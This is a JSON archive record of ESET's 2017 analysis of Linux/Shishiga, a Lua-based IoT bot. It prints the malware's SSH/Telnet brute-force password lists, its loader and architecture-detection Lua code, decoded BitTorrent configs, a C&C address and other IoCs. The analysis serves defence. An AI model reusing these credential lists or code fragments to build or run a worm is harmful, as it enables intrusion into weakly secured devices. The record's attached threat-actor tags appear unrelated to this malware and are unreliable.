{
    "id": "a6dac99c-90df-449b-a925-8baf49fff683",
    "created_at": "2023-01-12T15:04:27.269114Z",
    "updated_at": "2025-03-27T02:09:07.817792Z",
    "deleted_at": null,
    "sha1_hash": "6e8205e9ed9d3ec046ac10eb27a68a8d4e453c74",
    "title": "2017-04-25 - Linux Shishiga malware using LUA scripts",
    "authors": "",
    "file_creation_date": "2022-05-28T18:05:56Z",
    "file_modification_date": "2022-05-28T18:05:56Z",
    "file_size": 300114,
    "plain_text": "# Linux Shishiga malware using LUA scripts\n\n**[welivesecurity.com/2017/04/25/linux-shishiga-malware-using-lua-scripts/](https://www.welivesecurity.com/2017/04/25/linux-shishiga-malware-using-lua-scripts/)**\n\nApril 25, 2017\n\nThe usage of the BitTorrent protocol and Lua modules separates Linux/Shishiga from other\ntypes of malware, according to analysis by ESET.\n\nAmong all the Linux samples that we receive every day, we noticed one sample detected\nonly by Dr.Web – their detection name was Linux.LuaBot. We deemed this to be suspicious\nas our detection rates for the [Luabot family have generally been high. Upon analysis, it](http://blog.malwaremustdie.org/2016/09/mmd-0057-2016-new-elf-botnet-linuxluabot.html)\n[turned out that this was, indeed, a bot written in Lua, but it represents a new family, and is](https://www.lua.org/)\nnot related to previously seen Luabot malware. Thus, we’ve given it a new name:\nLinux/Shishiga. It uses 4 different protocols (SSH – Telnet – HTTP – BitTorrent) and Lua\nscripts for modularity.\n\n## How to meet Shishiga?\n\nLinux/Shishiga targets GNU/Linux systems. Its infection vector is a very common one:\nbruteforcing weak credentials based on a password list. It does this in a similar fashion to\n[Linux/Moose with the added capability to bruteforce SSH credentials too. Here is the](http://www.welivesecurity.com/2016/11/02/linuxmoose-still-breathing/)\ncomplete credentials list at the time of writing:\n\n\n-----\n\n**_bftelnet.lua_**\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n\n\n[...]\n\nlocal accounts={\n\n{\"admin\",\"admin\"},\n\n{\"root\",\"root\"},\n\n{\"adm\",\"adm\"},\n\n{\"acer\",\"acer\"},\n\n{\"user\",\"user\"},\n\n{\"security\",\"security\"}\n\n}\n\n[...]\n\n\n**_bfssh.lua_**\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n\n\n[...]\n\nlocal accounts={\n\n{\"admin\",\"admin\"},\n\n{\"root\",\"root\"},\n\n{\"adm\",\"adm\"},\n\n{\"ubnt\",\"ubnt\"},\n\n{\"root\",\"\"},\n\n{\"admin\",\"\"},\n\n{\"adm\",\"\"},\n\n{\"user\",\"user\"},\n\n{\"pi\",\"pi\"},\n\n}\n\n--[[\n\n\n-----\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n\n{ acer, acer },\n\n{\"security\",\"security\"},\n\n{\"root\",\"toor\"},\n\n{\"root\",\"roottoor\"},\n\n{\"root\",\"password\"},\n\n{\"root\",\"test\"},\n\n{\"root\",\"abc123\"},\n\n{\"root\",\"111111\"},\n\n{\"root\",\"1q2w3e\"},\n\n{\"root\",\"oracle\"},\n\n{\"root\",\"1q2w3e4r\"},\n\n{\"root\",\"123123\"},\n\n{\"root\",\"qwe123\"},\n\n{\"root\",\"p@ssw0rd\"},\n\n{\"root\",\"1\"},\n\n{\"root\",\"12\"},\n\n{\"root\",\"123\"},\n\n{\"root\",\"1234\"},\n\n{\"root\",\"12346\"},\n\n{\"root\",\"123467\"},\n\n{\"root\",\"1234678\"},\n\n{\"root\",\"12346789\"},\n\n{\"root\",\"123467890\"},\n\n{\"root\",\"qwerty\"},\n\n{\"root\",\"pass\"},\n\n\n-----\n\n43\n\n44\n\n45\n\n46\n\n47\n\n48\n\n49\n\n50\n\n51\n\n52\n\n53\n\n54\n\n55\n\n56\n\n57\n\n58\n\n59\n\n60\n\n\n{ root, toor },\n\n{\"root\",\"roottoor\"},\n\n{\"root\",\"password123\"},\n\n{\"root\",\"password123456\"},\n\n{\"root\",\"pass123\"},\n\n{\"root\",\"password\"},\n\n{\"root\",\"passw0rd\"},\n\n{\"root\",\"1qaz\"},\n\n{\"root\",\"1qaz2wsx\"},\n\n{\"root\",\"asdfgh\"},\n\n{\"user\",\"user\"},\n\n{\"user\",\"\"},\n\n{\"acer\",\"acer\"},\n\n{\"security\",\"security\"},\n\n{\"root\",\"passw0rds\"},\n\n]]\n\n[...]\n\n\nWe found several binaries of Linux/Shishiga for various architectures such as MIPS (both\nbig- and little-endian), ARM (armv4l), i686, and also PowerPC. These are common for IoT\ndevices. We think that other architectures like SPARC, SH-4 or m68k could be supported as\nwe will explain later.\n\n## Shishiga’s skills\n\n[Linux/Shishiga is a binary packed with UPX 3.91 (Ultimate Packer for Executables), but the](https://upx.github.io/)\nUPX tool will have trouble unpacking these binaries because Shishiga adds data at the end\nof the packed file.\n\nAfter unpacking, we see that it’s [statically linked with the Lua runtime library and stripped of](https://en.wikipedia.org/wiki/Static_library)\nall symbols.\n\n\n-----\n\n1\n\n2\n\n3\n\n\n$ file unpacked.i686.lm\n\nunpacked.i686.lm: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux),\n\nstatically linked, stripped\n\n\nOnce executed, the binary will initialize the `malware Lua module with the following`\nmethods:\n\nMalware methods\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n\nmalware_module_methods dd offset aGetver    ; \"getver\"\n\ndd offset getver\n\ndd offset aGetos    ; \"getos\"\n\ndd offset getos\n\ndd offset aGetarch   ; \"getarch\"\n\ndd offset getarch\n\ndd offset aGetmacaddr  ; \"getmacaddr\"\n\ndd offset getmacaddr\n\ndd offset aGetmods   ; \"getmods\"\n\ndd offset getmods\n\ndd offset aSetargs   ; \"setargs\"\n\ndd offset setargs\n\n\nThe `getmods method will return the archive blob as we will explain later. Then hardcoded`\nLua code ( malware.lua ) is executed via the `luaL_loadstring and` `lua_pcall functions.`\nThe Lua code is quite straightforward, but here is a quick walkthrough of the source code\nwithout any modifications on our part.\n\n**malware.lua**\n\n\n1\n\n2\n\n3\n\n4\n\n\nlocal unistd=require(\"posix.unistd\")\n\nrequire(\"malware\")\n\nfunction getexe()\n\n\n-----\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n\nlocal fn=unistd.readlink( /proc/self/exe )\n\nif fn==nil and arg~=nil then\n\nfn=arg[0] --symlink removed\n\nend\n\nif fn==nil then\n\nprint(\"couldn't find bot file\")\n\nreturn nil\n\nend\n\nlocal file=io.open(fn,\"r\")\n\nif file==nil then\n\nprint(\"couldn't find bot file\")\n\nreturn nil\n\nend\n\nlocal data=file:read(\"*all\")\n\nfile:close()\n\nreturn data\n\nend\n\nfunction getMods()\n\nreturn zlib.inflate()(malware.getmods())\n\nend\n\nfunction getScriptFiles(scripts)\n\nlocal files={}\n\nlocal i=1\n\n\n-----\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n43\n\n44\n\n45\n\n46\n\n47\n\n48\n\n49\n\n50\n\n51\n\n52\n\n53\n\n54\n\n55\n\n56\n\n57\n\n58\n\n59\n\n60\n\n\nwhile true do\n\nlocal a1,b1,c1=string.find(scripts,'%-%-script%-begin%-%-([%w%.]+)%-%-',i)\n\nif a1==nil then\n\nbreak\n\nend\n\nlocal a2,b2,c2=string.find(scripts,'%-%-script%-end%-%-([%w%.]+)%-%-',i)\n\nif a2==nil then\n\nbreak\n\nend\n\nif c1~=c2 then\n\nreturn nil\n\nend\n\nlocal src=string.sub(scripts,b1+1,a2-1)\n\ni=b2+1\n\nfiles[c1]=src\n\nend\n\nreturn files\n\nend\n\nmalware.exe=getexe() 1\n\nlocal modules=getScriptFiles(getMods()) 2\n\n[...]\n\n\n-----\n\n61\n\n62\n\n63\n\n64\n\n65\n\n\nf=load(malware.modules[ main.lua ]) 3\n\nlocal s,err=pcall(f)\n\nif s==false then\n\nprint(err)\n\nend\n\n\n**(1)** open the malware executable file from `/proc/self/exe and return its content;`\n\n**(2)** [retrieve the zlib archive via](http://www.zlib.net/) `getmods method, decompresses it, then parse it using`\ntags and store it in a Lua’s array;\n\n**(3)** call `main.lua module;`\n\nThere is an exhaustive list of all Lua scripts found in the IoCs section. Most of them have\nself-explanatory filenames, but here is a brief summary of some of them.\n\n**callhome.lua**\n\nretrieve the configuration file `server.bt or` `servers from` `config.lua ;`\nif unable to reach the current default server, change to a different server;\nsend files (reports or accounts, both JSON formatted);\nexecute tasks from task list retrieved from the C&C server;\n\n**bfssh.lua / bftelnet.lua**\n\nmodule to bruteforce SSH and Telnet logins;\ncheck if the command `echo -en \"\\\\x31\\\\x33\\\\x33\\\\x37\" outputs` `1337 ; if not,`\nexit else continue;\ndevice architecture is determined from the `/bin/ls file by running` `cat /bin/ls`\n[and parsing the ELF header, see below;](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format)\nspread the malware (both `.lm and` `.dm files) according to the device architecture;`\nsave successful credentials;\n\nThe architecture checking code is as follows:\n\nbfssh.lua, getArchELF method\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n\nfunction bfssh.getArchELF(text)\n\nlocal bits,denc,ver,ftype,farch\n\nif text==nil then\n\nreturn nil\n\nend\n\nlocal i=text:find(\"\\x7fELF\") 1\n\nif i~=nil then\n\nbits,denc,ver=string.unpack(\"&lt;BBB\",text:sub(i+4))\n\nif denc==1 then\n\nftype,farch=string.unpack(\"&lt;HH\",text:sub(i+16)) 2\n\nelse\n\nftype,farch=string.unpack(\"&gt;HH\",text:sub(i+16))\n\nend\n\nend\n\nreturn bits,denc,farch 3\n\nend\n\n\n**(1)** every ELF file has to start with `\\x7fELF`\n\n**(2)** `ftype that represents` `e_type (ELF file type = executable, shared etc.) is not`\nused\n\n**(3)** `bits represents` `e_ident[EI_CLASS] (32-bit or 64-bit),` `denc represents`\n```\n   e_ident[EI_DATA] (little or big endian), and farch represents e_machine in\n\n```\nthe ELF header\n\nbfssh.lua, getArchName method\n\n\n1\n\n2\n\n3\n\n\nfunction bfssh.getArchName(bits,denc,farch) 1\n\nif farch==0x8 and denc==1 then 2\n\n\n-----\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n\nreturn mipsel\n\nend\n\nif farch==0x8 and denc==2 then\n\nreturn \"mips\"\n\nend\n\nif farch==0x28 then\n\nreturn \"armv4l\"\n\nend\n\nif farch==0x2 then\n\nreturn \"sparc\"\n\nend\n\nif farch==0x2a then\n\nreturn \"sh4\"\n\nend\n\nif farch==0x4 then\n\nreturn \"m68k\"\n\nend\n\nif farch==0x14 then\n\nreturn \"powerpc\"\n\nend\n\n\n-----\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n\nif farch==0x3 or farch==0x7 or farch==0x3e then 3\n\nreturn \"i686\"\n\nend\n\nreturn nil\n\nend\n\n\n**(1)** `bits is not used`\n\n**(2)** check if file is for MIPS little endian ( e_machine == `EM_MIPS and`\n```\n   e_ident[EI_DATA] == ELFDATA2LSB )\n\n```\n**(3)** check if file is for Intel 80386 or Intel 80860 or AMD x86-64 ( e_machine ==\n```\n   EM_386 or e_machine == EM_860 or e_machine == EM_X86_64 )\n\n```\n**config.lua**\n\ncontains publicKey to verify the signature of the binary (.lm or .dm);\ncontains bootstrap nodes list;\ncontains filenames of .bt files, port numbers of SOCKS and HTTP server;\ncontains IP address of the server (probably C&C server);\n\n**persist.lua**\n\npersistence method depending on the privilege (root or user)\n\n**scanner.lua**\n\nused to generate random /16 networks that are not local\n\n**worm.lua (this script was removed in the latest version of Linux/Shishiga)**\n\nallows scanning on a given port;\nallows upload;\ngets information from the new infected server;\n\nThe `readme.lua script has a message banner that grabs your attention, if you speak`\nRussian:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n\nВСЁ ИДЁТ ПО ПЛАНУ\n\nА при коммунизме всё будет заебись\n\nОн наступит скоро — надо только подождать\n\nТам всё будет бесплатно,там всё будет в кайф\n\nТам наверное вощще не надо будет (умирать)\n\nЯ проснулся среди ночи и понял, что \nВСЁ ИДЁТ ПО ПЛАНУ\n\n\nThis translates to:\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n\nEVERYTHING GOES ACCORDING TO PLAN\n\nWhen we get communism it'll all be fucking great.\n\nIt will come soon, we just have to wait.\n\nEverything will be free there, everything will be fun.\n\nWe'll probably not even have to die.\n\nI woke up in the middle of the night and realized\n\nEVERYTHING GOES ACCORDING TO PLAN\n\n\n[It seems that the malware author was inspired by E.Letov and his album](https://en.wikipedia.org/wiki/Grazhdanskaya_Oborona) `Everything`\n\n`goes according to plan – see the` [last verse of the title song.](http://www.gr-oborona.ru/texts/1056899068.html)\n\nOver the past few weeks, we observed some minor changes like parts of some modules\nbeing rewritten, addition of testing modules, removal of redundant files, but nothing\nespecially noteworthy.\n\nWhile the main binary is named `<architecture>.lm, we also managed to retrieve`\nbinaries with the following name `<architecture>.dm – a simple backdoor that listens on`\n```\n0.0.0.0 (all IPv4 addresses) port 2015 . One of the small changes was in the name of\n\n```\n\n-----\n\nthis backdoor binary – it changed from `dl to` `dm .`\n\n## Shishiga communication\n\nLinux/Shishiga can communicate using any of the modules `httpproto.lua,`\n```\nbtloader.lua or server.lua . The httpproto.lua module has functions that allow\n\n```\nthe given data to be encoded or decoded, and make HTTP POST and GET requests. The\nsource code below shows the process of encoding data.\n\nhttpproto.lua\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n\n\n[...]\n\nfunction httpproto.encode(data)\n\nlocal msg=bencode.encode(data)\n\nlocal c=zlib.crc32()(msg)\n\nlocal k=string.pack(\"<I\",utils.random())\n\nreturn k..crypto.rc4(k,string.pack(\"<I\",c)..msg)\n\nend\n\n[...]\n\n```\nbtloader.lua uses the torrent.lua module (a wrapper for BitTorrent functions) to\n\n```\nsave or load nodes from the `nodes.cfg file. It also retrieves its configuration data from`\n\n`{server,update,script}.bt files (in` [Bencode format) and uses the BitTorrent protocol](https://en.wikipedia.org/wiki/Bencode)\nto check for new versions of these files. `script.bt allows the execution of a Lua script`\nand `update.bt allows executing the` `.lm binary. Below are examples of decoded .bt`\nfiles shown as Python dictionaries.\n\nscript.bt\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n\n{\n\n'sig': &lt;removed&gt;,1\n\n'k': &lt;removed&gt;,2\n\n'salt': 'script',\n\n'seq': 1486885364,\n\n'v': 'caba4dbe2f7add9371b94b97cf0d351b72449072,test.lua\\n'\n\n}\n\n\n**(1)** signature\n\n**(2)** public key\n\nupdate.bt\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n\n{\n\n'sig': &lt;removed&gt;,\n\n'k': &lt;removed&gt;,\n\n'salt': 'update',\n\n'seq': 1486885364,\n\n'v':\n\n'bf4d9e25fc210a1d9809aebb03b30748dd588d08,mipsel.lm\\n\n\n8a0d58472f6166ade0ae677bab7940fe38d66d35,armv4l.lm\\n\n\n51a4ca78ebb0649721ae472290bea7bfe983d727,mips.lm\\n\n\n979fb376d6adc65473c4f51ad1cc36e3612a1e73,powerpc.lm\\n\n\nce4b3c92a96137e6215a5e2f5fd28a672eddaaab,i686.lm\\n'\n\n}\n\n\nserver.bt\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n\n{\n\n'sig': &lt;removed&gt;,\n\n'k': &lt;removed,\n\n'salt': 'server',\n\n'seq': 1486835166,\n\n'v': '93.117.137.35:8080\\n'\n\n}\n\n\nFinally, the `server.lua module’s main functionality is to create an HTTP server with the`\nport defined in `config.lua . In all samples we have analyzed so far, that is port 8888.`\n\nThe server responds only to `/info and` `/upload requests. Below is a (prettified) version`\nof the server response to the `/info path. All of the files below can be easily downloaded`\nfrom the infected device.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n\n{\n\n\"src\":[ 1\n\n\"test.lua\",\n\n\"test1.lua\",\n\n\"test10.lua\",\n\n\"test2.lua\",\n\n\"test3.lua\",\n\n\"test5.lua\",\n\n\"test6.lua\",\n\n\"test_1.lua\",\n\n\"test_2.lua\",\n\n\"test_3.lua\",\n\n\"test_4.lua\"\n\n],\n\n\n-----\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n\ndm :[ 2\n\n\"armv4l.dm\",\n\n\"i686.dm\",\n\n\"mips.dm\",\n\n\"mipsel.dm\"\n\n],\n\n\"bt\":[ 3\n\n\"script.bt\",\n\n\"server.bt\",\n\n\"update.bt\"\n\n],\n\n\"version\":\"1.0.0\", 4\n\n\"lua\":[ 5\n\n\"armv4l.lm\",\n\n\"i686.lm\",\n\n\"mips.lm\",\n\n\"mipsel.lm\",\n\n\"powerpc.lm\"\n\n],\n\n\"os\":\"lin\",\n\n\"arch\":\"i686\",\n\n\"lua_version\":\"Lua 5.3\"\n\n}\n\n\n-----\n\n**(1)** Lua scripts\n\n**(2)** backdoor (old name: `.dl )`\n\n**(3)** BitTorrent scripts\n\n**(4)** malware version\n\n**(5)** modules loader\n\nQuerying the root `/ on port` `8888 will result in` `HTTP/1.0 404 OK, which serves as a`\nsimple indicator of compromise (IoC).\n\nhttp.lua response function\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n\nfunction http.response(req,code,data,timeout)\n\ntimeout=timeout or timeoutDef\n\nlocal hdr=\"HTTP/1.0 %d OK\\r\\nContent-Length: %d\\r\\nConnection: close\\r\\n\\r\\n\"\n\nasync.sendall(req.sock,hdr:format(code,data:len())..data,timeout)\n\nreturn true\n\nend\n\n\n[At this point in our investigation, we asked the Censys team to do a mass scan of the](https://censys.io/)\nInternet on TCP port 8888. They found about 10 IP addresses that match this particular\nHTTP answer. These IP addresses are potentially infected machines.\n\n## Conclusion\n\nAt a first glance, Linux/Shishiga might appear to be like the others, spreading through weak\nTelnet and SSH credentials, but the usage of the BitTorrent protocol and Lua modules\n[separates it from the herd. BitTorrent used in a Mirai-inspired worm, Hajime, was observed](https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf)\nlast year and we can only speculate that it might become more popular in the future.\n\nIt’s possible that Shishiga could still evolve and become more widespread but the low\nnumber of victims, constant adding, removing, and modifying of the components, code\ncomments and even debug information, clearly indicate that it’s a work in progress. To\nprevent your devices from being infected by Shishiga and similar worms, you should not\nuse default Telnet and SSH credentials.\n\n[We would like to thank the Censys team for their collaboration.](https://censys.io/)\n\n\n-----\n\n## IoCs\n\nC&C\n\n93.117.137.35\n\nSHA-1 hashes (.lm)\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n\n003f548796fb52ad281ae82c7e0bb7532dd34241\n\n1a79092c6468d39a10f805c96ad7f8bf303b7dc8\n\n1cc1b97f8f9bb7c4f435ef1316e08e5331b4331b\n\n2889803777e2dfec7684512f45e87248a07d508f\n\n2a809d37be5aa0655f5cc997eb62683e1b45da17\n\n3f1ef05ca850e2f5030ee279b1c589c9e3cc576c\n\n41bf0d5612ba5bc9a05e9d94df0f841b159264a0\n\n4bc106f6231daa6641783dd9276b4f5c7fc41589\n\n4d55efe18643d7408cbe12dd4f319a68084bd11e\n\n4df58ab26f0fc8ec2d1513611ca2b852e7107096\n\n51a4ca78ebb0649721ae472290bea7bfe983d727\n\n5a88b67d8dfaf1f68308311b808f00e769e39e46\n\n6458c48e5167a2371d9243d4b47ad191d642685b\n\n688ccbca8b2918a161917031e21b6810c59eeab0\n\n6e3ba86d1f91669e87945b8ea0211b58e315e189\n\n6f41c8f797814e2e3f073601ce81e8adceef6a27\n\n8a0d58472f6166ade0ae677bab7940fe38d66d35\n\n8a1f9212f181e68a63e06a955e64d333b78c6bf6\n\n8e3c4eb04d4cfd8f44c721111c5251d30ac848b6\n\n979fb376d6adc65473c4f51ad1cc36e3612a1e73\n\na1f2535576116d93b62d7f5fc6e30e66e0e0a216\n\na694c6ecc2ff9702905f22b14ed448e9e76fe531\n\nac094b239851eaf2e9fd309285c0996fb33771a8\n\n\n-----\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n\nb14f7af9665ef77af530109a0331f8ca0bd2a167\n\nb86935c4539901cdec9081d8a8ca915903adaff1\n\nba5df105496b0c4df7206d29fa544b7a7a346735\n\nbf4d9e25fc210a1d9809aebb03b30748dd588d08\n\nc22f0fb01c6d47957732a8b0f5ef0f7d4e614c79\n\nce4b3c92a96137e6215a5e2f5fd28a672eddaaab\n\nd8a5d9c4605b33bd47fedbad5a0da9928de6aa33\n\nf73022a4801e06d675e5c3011060242af7b949ad\n\n\nSHA-1 hashes (.dl)\n\n\n1\n\n2\n\n3\n\n4\n\n\n274181d2f9c6b8f0e217db23f1d39aa94c161d6e\n\n8abbb049bffd679686323160ca4b6a86184550a1\n\n95444c2ccc5fff19145d60f1e817fd682cabe0cd\n\n9cde845852653339f67667c2408126f02f246949\n\n\nLua’s scripts filename\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n\nasync.lua\n\nasync.lua.old\n\nbencode.lua\n\nbfssh.lua\n\nbfssh.lua.old2\n\nbftelnet.lua\n\nbtloader.lua\n\ncallhome.lua\n\ncallhome.lua.old\n\nconfig.lua\n\ncrypto.lua\n\ndht lua\n\n\n-----\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n\nevent.lua\n\nevs.lua\n\nhttp.lua\n\nhttpproto.lua\n\nlibevent2.lua\n\nluaevent.lua\n\nmain.lua\n\nmain2.lua\n\nmalware.lua\n\npersist.lua\n\nreadme.lua\n\nrouting.lua\n\nscanner.lua\n\nscanner2.lua\n\nserver.lua\n\nsocket.lua\n\nsocks.lua\n\nssh.lua\n\nssl.lua\n\ntelnet.lua\n\ntest.lua\n\ntest1.lua\n\ntest10.lua\n\ntest2.lua\n\ntest3.lua\n\ntest5.lua\n\ntest6.lua\n\nthreads.lua\n\n\n-----\n\n41\n\n42\n\n43\n\n44\n\n\ntorrent.lua\n\nudp.lua\n\nutils.lua\n\nworm.lua\n\n\nFiles that could potentially indicate an infection\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n\n/tmp/.local/*\n\n/tmp/drop\n\n/tmp/srv\n\n$HOME/.local/ssh.txt\n\n$HOME/.local/telnet.txt\n\n$HOME/.local/nodes.cfg\n\n$HOME/.local/check\n\n$HOME/.local/script.bt\n\n$HOME/.local/update.bt\n\n$HOME/.local/server.bt\n\n$HOME/.local/syslog\n\n$HOME/.local/syslog.pid\n\n$HOME/.local/{armv4l,i686,mips,mipsel}.dm\n\n$HOME/.local/{armv4l,i686,mips,mipsel,powerpc}.lm\n\n/etc/rc2.d/S04syslogd\n\n/etc/rc3.d/S04syslogd\n\n/etc/rc4.d/S04syslogd\n\n/etc/rc5.d/S04syslogd\n\n/etc/init.d/syslogd\n\n/bin/syslogd\n\n/etc/cron.hourly/syslogd\n\n\n25 Apr 2017 - 03:00PM\n\n### Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center\n\n\n-----\n\n### Newsletter\n\n Discussion\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-04-25 - Linux Shishiga malware using LUA scripts.pdf"
    ],
    "report_names": [
        "2017-04-25 - Linux Shishiga malware using LUA scripts.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
            "created_at": "2023-01-06T13:46:38.814104Z",
            "updated_at": "2025-03-27T02:00:02.925972Z",
            "deleted_at": null,
            "main_name": "MageCart",
            "aliases": [],
            "source_name": "MISPGALAXY:MageCart",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535867,
    "ts_updated_at": 1743041347,
    "ts_creation_date": 1653761156,
    "ts_modification_date": 1653761156,
    "files": {
        "pdf": "https://archive.orkl.eu/6e8205e9ed9d3ec046ac10eb27a68a8d4e453c74.pdf",
        "text": "https://archive.orkl.eu/6e8205e9ed9d3ec046ac10eb27a68a8d4e453c74.txt",
        "img": "https://archive.orkl.eu/6e8205e9ed9d3ec046ac10eb27a68a8d4e453c74.jpg"
    }
}